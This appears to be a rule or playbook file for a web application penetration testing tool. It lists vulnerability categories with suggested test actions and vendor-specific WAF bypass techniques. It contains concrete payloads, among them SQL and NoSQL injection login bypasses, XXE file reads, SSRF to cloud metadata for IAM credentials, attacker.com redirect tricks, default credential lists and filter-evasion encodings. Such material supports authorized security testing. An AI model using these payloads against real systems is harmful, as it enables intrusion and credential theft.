fuzzing_required.description: API endpoints with rich input surface need aggressive parameter fuzzing for injection discovery
suggested_actions: Run ffuf -w params.txt:PARAM -w payloads.txt:VAL on all endpoints with -mc 200,201,302,500
Test ALL string params simultaneously with: ' " <script>alert(1)</script> {{7*7}} ../../../etc/passwd
Fuzz HTTP methods: try PATCH/PUT/DELETE/CONNECT/TRACE on POST-only and GET-only endpoints

race_condition_likely.description: Financial/state-changing endpoints — race condition potential for double-spend or state corruption
suggested_actions: Send 50 simultaneous requests with same idempotency key — check if action applied multiple times
Turbo Intruder gate: prepare all requests then release simultaneously with last-byte sync technique
Compare final state vs expected: 50 concurrent withdrawals of $1 should not exceed account balance

idor_hotspot.description: Object reference parameters (IDs) detected — IDOR highly likely across user/resource boundaries
suggested_actions: Replace your user_id with adjacent IDs (id-1, id+1, id+100) — check for other users data in response
Create two test accounts, capture account1 object IDs, access them from account2 authenticated session
Vertical escalation: use regular user session to access admin-owned object IDs (1, 2, 3, 999)

creative_bypass_needed.description: Security controls detected — WAF/filter bypass techniques required for exploit confirmation
suggested_actions: Encoding bypass: URL-encode, double-encode, Unicode normalize, hex-encode payloads to bypass WAF signatures
Case/whitespace: <ScRiPt>, null bytes %00, tab %09/newline %0a as whitespace alternatives in payloads
Split payload across multiple parameters or chunked Transfer-Encoding to evade single-field inspection

api_versioning_exposure.description: Multiple API versions active — older versions often lack security controls of current version
suggested_actions: If /api/v2/users has auth, test /api/v1/users and /api/v0/users — older versions often lack auth middleware
Probe /api/beta/, /api/internal/, /api/dev/, /api/test/ — dev/staging endpoints may bypass production auth
Compare response schemas between versions — v1 may return extra sensitive fields stripped in v2

authentication_bypass_surface.description: Login/auth endpoints — multiple bypass techniques applicable including SQLi, NoSQLi, and default creds
suggested_actions: SQL injection: admin'-- in username field, ' OR '1'='1'-- in password — classic bypass
NoSQL injection: send JSON {"username":{"$ne":null},"password":{"$ne":null}} as request body
Try default credentials: admin/admin, admin/password, root/root, admin/admin123, test/test — common defaults

session_security_testing.description: Session management — token predictability, fixation, and logout bypass testing
suggested_actions: Capture 10 sequential session tokens and analyze entropy/pattern — low entropy = predictable tokens
Session fixation: set session cookie before auth, verify it changes after successful login
Replay old cookie after logout against /api/user — check if server properly invalidates sessions

cors_misconfiguration_testing.description: CORS policy audit — reflective, null origin, subdomain wildcard with credentials
suggested_actions: Send Origin: https://evil.com — check if reflected in Access-Control-Allow-Origin with Credentials: true
Send Origin: null — accessible from sandboxed iframes; some APIs explicitly allowlist null origin
Try Origin: https://evil.target.com — regex-based origin checks may allow any *.target.com subdomain

xxe_injection_surface.description: XML/SOAP/SVG processing endpoints — XXE injection potential for file read and blind SSRF
suggested_actions: Classic XXE: POST with <!DOCTYPE f [<!ENTITY e SYSTEM 'file:///etc/passwd'>]><f>&e;</f>
OOB blind: <!ENTITY % p SYSTEM 'http://BURP-COLLABORATOR/'> — detect via DNS/HTTP callback
SVG upload XXE: <svg><image href='file:///etc/passwd'/></svg> — trigger via render/thumbnail endpoint

header_injection_testing.description: HTTP headers as SSRF/cache/redirect attack vectors — Host, X-Forwarded-For, Referer manipulation
suggested_actions: Host header injection: set Host: 169.254.169.254 — forces cloud metadata SSRF via proxy reflection
X-Forwarded-Host: attacker.com — check if reflected in redirect URL, email links, or password reset
Referer SSRF: Referer: http://169.254.169.254/latest/meta-data/ — apps that process Referer as URL

graphql_security_testing.description: GraphQL endpoint — introspection, batching abuse, depth attacks, IDOR via node enumeration
suggested_actions: Introspection: POST {"query":"{__schema{types{name fields{name type{name}}}}}"} — dump full schema
Rate limit bypass via batching: [{"query":"mutation{login(u:'a',p:'x')}"}] x1000 in one request
Field suggestion oracle: send invalid field name — use 'Did you mean X?' hints to discover hidden fields

error_disclosure_mining.description: Error messages and verbose responses leak DB structure, paths, and framework versions
suggested_actions: Trigger 500: send malformed JSON body, type mismatches, very long strings — capture full stack traces
SQLi error mining: inject ' in all string params — MySQL/MSSQL errors reveal table/column names
Type confusion: send array where scalar expected — some frameworks reveal internal type info in errors

cloud_metadata_testing.description: Cloud infrastructure detected — SSRF to metadata endpoint enables IAM credential theft
suggested_actions: AWS IMDS: GET http://169.254.169.254/latest/meta-data/iam/security-credentials/ via SSRF vector
GCP metadata: GET http://metadata.google.internal/computeMetadata/v1/ with Metadata-Flavor: Google header
Azure IMDS: GET http://169.254.169.254/metadata/instance?api-version=2021-02-01 with Metadata: true header

oauth_oidc_security_testing.description: OAuth2/OIDC implementation — state bypass, PKCE missing, redirect_uri manipulation
suggested_actions: State bypass: remove state parameter from OAuth flow entirely — check if CSRF protection is enforced
Open redirect: try redirect_uri=https://attacker.com to steal auth code via referrer header
PKCE bypass: send code_challenge but omit code_verifier in token exchange — does server accept it?

api_key_leakage_hunting.description: API keys and secrets may leak in JS files, response headers, or exposed config endpoints
suggested_actions: Search all JS files: grep -E '['"]?(api[_-]?key|secret|token)['"]?\s*[:=]\s*['"][A-Za-z0-9]{20,}' *.js
Check response headers for leaked tokens: X-API-Key, X-Auth-Token, X-Secret
Probe: GET /.env, /config.json, /config.yaml, /secrets.json, /.git/config — common credential exposures

subdomain_takeover_testing.description: Subdomains with dangling CNAME to unclaimed services — takeover enables phishing and cookie theft
suggested_actions: For each subdomain with CNAME, resolve target and check if service is claimable (404/NoSuchBucket/unconfigured)
AWS S3: if CNAME points to BUCKETNAME.s3.amazonaws.com and bucket not found — create and claim it
Test if subdomain cookie scope affects main domain: set cookie on taken subdomain to steal parent session

open_redirect_url_param.description: URL-accepting parameter detected — test all protocol schemes for redirect abuse and protocol-handler injection
suggested_actions: Test every URL-accepting parameter with non-http protocols: javascript:, data:text/html, vbscript: — many filters only block http://evil.com but not these
Test URL parser confusion: //attacker.com, ///attacker.com, \\attacker.com, https:attacker.com, /\attacker.com
Test allowlist bypass via userinfo and path confusion: https://trusted.com@attacker.com, https://trusted.com.attacker.com, https://attacker.com/trusted.com
Measure response: does it return Location header? Does body contain the URL? Does it actually navigate? Each behavior requires different follow-up.
Chain potential: a redirect that accepts javascript: is DOM execution on click; a redirect that accepts //attacker.com can steal auth tokens via Referer

default_credentials_testing.description: Admin panels and management interfaces may use default factory credentials
suggested_actions: Try admin panels with: admin/admin, admin/password, admin/admin123, root/root, guest/guest
Service-specific: Jenkins=admin/admin, Grafana=admin/admin, Kibana=elastic/<blank>, Tomcat=tomcat/tomcat
Check /robots.txt, /sitemap.xml, /admin/, /.well-known/ for hidden admin paths then test default creds

generic: Case variation: change keywords to mixed case (SeLeCt, UnIoN, ScRiPt)
Comment insertion: inject SQL/JS comments to break patterns (UN/**/ION, al/**/ert)
Whitespace substitution: use tab (\t), newline (\n), or comments instead of spaces
HTTP verb tampering: try POST instead of GET, add X-HTTP-Method-Override header
Parameter pollution: duplicate parameters with payloads (param=clean&param=payload)
Header injection: move payload to X-Forwarded-For, User-Agent, or Referer header
Chunked encoding: use Transfer-Encoding: chunked to split payload across chunks
Unicode normalization: use Unicode equivalents (\u003c for <, \u0027 for ')
Null byte injection: insert %00 before or within payloads to confuse parsers
cloudflare: Use Base64 encoding for XSS payloads (eval(atob('...'))) — Cloudflare misses encoded JS
SVG-based XSS: <svg/onload=alert(1)> often bypasses Cloudflare script filters
JavaScript template literals: `${alert(1)}` as alternative to function calls
SQL comments to split keywords: UN/**/ION SE/**/LECT 1,2,3
Chunked parameter delivery via HTTP/2 multiplexing (use Burp HTTP/2 tab)
Timing-based blind SQLi with SLEEP() — response timing bypasses pattern matching
Header injection: move SQLi/XSS to User-Agent field instead of query parameter
modsecurity: Use hex encoding for SQL keywords: 0x53454c454354 (SELECT in hex)
Multipart boundary abuse: inject payload in filename field of file upload
Nested encoding: HTML-encode XSS inside attribute values (<script>)
JSON parameter type confusion: send string where integer expected (bypass type rules)
Case variation plus double-URL encoding: %2553%2545%254c (SEC double-encoded)
Blind time-based SQLi with database-specific functions (BENCHMARK, PG_SLEEP)
aws_waf: Use JSON body for injection (AWS WAF SQL rules focus on query params)
GraphQL injection: use GraphQL introspection to bypass REST WAF rules
Regex bypass: insert unprintable Unicode chars (\u200b zero-width space) in payloads
HTTP/2 pseudo-header injection: add payload in :path or :authority pseudo-headers
Content-Type mutation: send application/x-www-form-urlencoded payload as text/plain
Padding: add long benign parameter values before injection to exhaust WAF regex budget
imperva_incapsula: Use encoded newlines (\r\n) in payloads to split HTTP header context
JavaScript string concatenation: al'+'ert(1) to bypass string matching
DOM-based XSS via fragment (#) — Imperva may not inspect URL fragments
Second-order injection: inject payload into stored field, trigger via separate request
PUT method with JSON body: Imperva SQL rules often miss PUT+JSON combinations
Wildcard subdomain exploitation: request via unprotected subdomain if WAF is front-only
akamai: Use UTF-7 encoding for XSS in legacy IE-compatible responses
HTTP request smuggling: CL+TE or TE+TE desync to smuggle bypassed requests
Uncommon MIME types: send multipart/alternative with injection in second part
Path traversal case variation: %2F vs / vs %252F on different segments
Rate-limit bypass via IP rotation or X-Forwarded-For header spoofing
